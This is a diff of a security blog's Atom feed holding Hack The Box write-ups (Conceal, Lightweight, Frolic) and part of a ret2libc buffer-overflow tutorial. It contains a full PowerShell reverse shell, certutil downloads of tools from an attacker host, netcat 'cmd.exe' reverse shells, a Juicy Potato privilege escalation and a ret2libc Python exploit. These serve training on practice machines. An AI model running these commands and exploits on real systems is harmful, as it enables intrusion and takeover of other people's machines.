+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&amp;gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-user&quot;&gt;We got user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag&quot;&gt;SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;after-getting-user-the-privilege-escalation-is-easy-and-straightforward-before-doing-any-enumeration-i-checked-my-privileges-as-destitute-and-i-found-that-i-had-the-seimpersonateprivilege&quot;&gt;After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as &lt;code class=&quot;highlighter-rouge&quot;&gt;Destitute&lt;/code&gt; and I found that I had the &lt;code class=&quot;highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;this-means-that-we-can-apply-the-famous-attack-juicy-potato-you-can-read-about-it-on-the-official-github-repository-we-need-to-know-the-version-of-this-windows-to-pick-the-right-clsid&quot;&gt;This means that we can apply the famous attack &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt;. You can read about it on the &lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;official github repository&lt;/a&gt;. We need to know the version of this windows to pick the right &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;its-microsoft-windows-10-enterprise-i-got-the-clsid-of--wuauserv-from-here-which-is--e60687f7-01a1-40aa-86ac-db1cbf673334&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Microsoft Windows 10 Enterprise&lt;/code&gt;. I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt; of  &lt;code class=&quot;highlighter-rouge&quot;&gt;wuauserv&lt;/code&gt; from &lt;a href=&quot;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise&quot;&gt;here&lt;/a&gt; which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;{e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;i-got-a-compiled-binary-of-juicy-potato-from-the-github-repository-i-hosted-it-on-a-python-simple-http-server-then-i-downloaded-it-on-the-machine-with-certutil-&quot;&gt;I got a compiled binary of &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt; from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;however-i-had-some-problems-with-my-powershell-reverse-shell-and-it-couldnt-run-juicypotatoexe-properly-so-i-got-another-cmd-shell-with-nc-&quot;&gt;However I had some problems with my powershell reverse shell and it couldn’t run &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; properly so I got another &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1339&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/24.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-created-a-bat-file-that-executes--ncexe--e-cmdexe-1010xxxx-1340-to-get-me-a-reverse-shell-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file that executes : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1340&lt;/code&gt; to get me a reverse shell :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &amp;gt; rev.bat&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-ran-juicypotatoexe-and-made-it-execute-that-bat-file-&quot;&gt;Then I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; and made it execute that &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-fine-and-we-got-a-reverse-shell-as-nt-authoritysystem&quot;&gt;It worked fine and we got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/27.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in&quot;&gt;Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.119&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lightweight.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
@@ -333,6 +864,7 @@ PORT    STATE SERVICE
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree filter: (objectclass=*) requesting: ALL #</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lightweight/0.png" /></entry><entry><title type="html">Hack The Box - BigHead</title><link href="http://localhost:4000/hack-the-box/bighead/" rel="alternate" type="text/html" title="Hack The Box - BigHead" /><published>2019-05-04T00:00:00+02:00</published><updated>2019-05-04T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/bighead</id><content type="html" xml:base="http://localhost:4000/hack-the-box/bighead/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -2566,160 +3098,4 @@ return false;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---carrier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/carrier/&quot;&gt;Hack The Box - Carrier&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---curling&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/curling/&quot;&gt;Hack The Box - Curling&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;amp;&amp;amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … this : ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Ook! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/frolic/0.png" /></entry><entry><title type="html">Buffer Overflow Practical Examples , ret2libc - protostar stack6</title><link href="http://localhost:4000/binary-exploitation/bof6/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , ret2libc - protostar stack6" /><published>2019-03-20T00:00:00+02:00</published><updated>2019-03-20T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof6</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof6/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys--in-the-last-post-about-buffer-overflow-we-exploited-a-buffer-overflow-vulnerability-where-we-were-able-to-inject-a-shellcode-and-escalate-privileges-to-root-but-that-was-possible-because-we-were-able-to-overwrite-the-return-address-to-another-address-on-the-stack-where-we-placed-our-shellcode--but-what-if-the-stack-is-non-executable--we-will-perform-an-attack-called-ret2libc-and-thats-what-we-are-going-to-discuss-today-with-protostar---stack6-without-wasting-more-time-lets-jump-right-in-&quot;&gt;Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !&lt;/h4&gt;
-&lt;h4 id=&quot;read-the-previous-posts-if-you-havent-yet&quot;&gt;Read the &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;previous posts&lt;/a&gt; if you haven’t yet.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;stack6&quot;&gt;./stack6&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-are-given-the-source-code-of-the-binary-&quot;&gt;As always we are given the source code of the binary :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-void getpath()
-{
-        char buffer[64];
-        unsigned int ret;
-
-        printf(&quot;input path please: &quot;); fflush(stdout);
-
-        gets(buffer);
-
-        ret = __builtin_return_address(0);
-
-        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
-                printf(&quot;bzzzt (%p)\n&quot;, ret);
-                _exit(1);
-        }
-
-        printf(&quot;got path %s\n&quot;, buffer);
-}
-
-int main(int argc, char **argv)
-{
-        getpath();
-
-
-
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;what-this-code-is-doing-is-just-printing-input-path-please-then-it-stores-our-input-in-a-buffer-of-64-chars-and-finally-it-prints-it-out&quot;&gt;What this code is doing is just printing &lt;code class=&quot;highlighter-rouge&quot;&gt;input path please:&lt;/code&gt; then it stores our input in a buffer of 64 chars and finally it prints it out:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;our-problem-is-this-if-statement-&quot;&gt;Our problem is this &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
-                printf(&quot;bzzzt (%p)\n&quot;, ret);
-                _exit(1);
-        }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;this-is-making-sure-that-the-return-address-is-not-on-the-stack--which-makes-it-not-possible-to-perform-a-shellcode-injection-like-we-did-in-the-previous-example-we-can-defeat-this-by-a-technique-called-ret2libc&quot;&gt;This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;previous example&lt;/a&gt;. We can defeat this by a technique called ret2libc.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;ret2libc&quot;&gt;ret2libc&lt;/h3&gt;
-&lt;h4 id=&quot;so-what-is-ret2libc--if-we-take-the-word-itself--ret-is-return--2-means-to-and-libc-is-the-c-library-the-idea-behind-ret2libc-is-instead-of-injecting-shellcode-and-jumping-to-the-address-that-holds-that-shellcode-we-can-use-the-functions-that-are-already-in-the-c-library-for-example-we-can-call-the-function-system-and-make-it-execute-binsh-read-about-system-here-we-will-also-need-to-use-the-function-exit-to-make-the-program-exit-cleanly-read-about-exit-here&quot;&gt;So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and make it execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_system.htm&quot;&gt;here&lt;/a&gt;). We will also need to use the function &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; to make the program exit cleanly. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm&quot;&gt;here&lt;/a&gt;).&lt;/h4&gt;
-&lt;h4 id=&quot;so-finally-our-attack-payload-will-be--padding--address-of-system--address-of-exit--binsh-instead-of--padding--new-return-address--nop--shellcode&quot;&gt;So finally our attack payload will be : “padding –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”.&lt;/h4&gt;
-&lt;h4 id=&quot;now-lets-see-how-will-we-do-it&quot;&gt;Now let’s see how will we do it.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;exploiation&quot;&gt;Exploiation&lt;/h3&gt;
